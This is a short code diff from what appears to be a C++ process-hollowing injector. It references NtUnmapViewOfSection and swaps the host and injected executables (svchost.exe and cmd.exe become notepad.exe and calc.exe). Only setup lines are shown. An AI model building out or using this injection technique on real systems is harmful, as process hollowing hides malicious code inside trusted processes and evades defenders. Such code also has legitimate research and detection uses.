@@ -25,7 +25,7 @@ typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
 
 int main()
 {
-    const char* filename = "C:\\Windows\\System32\\svchost.exe";
+    const char* filename = "C:\\Windows\\System32\\notepad.exe";
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -33,7 +33,7 @@ int main()
     ZeroMemory(&pi, sizeof(pi));
 
     // Shellcode
-    const char* evilfilename = "C:\\Windows\\System32\\cmd.exe";
+    const char* evilfilename = "C:\\Windows\\System32\\calc.exe";
     HANDLE hFile = CreateFileA(evilfilename, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
     if (!hFile) {
         std::cerr << "[x] Error: " << std::endl;
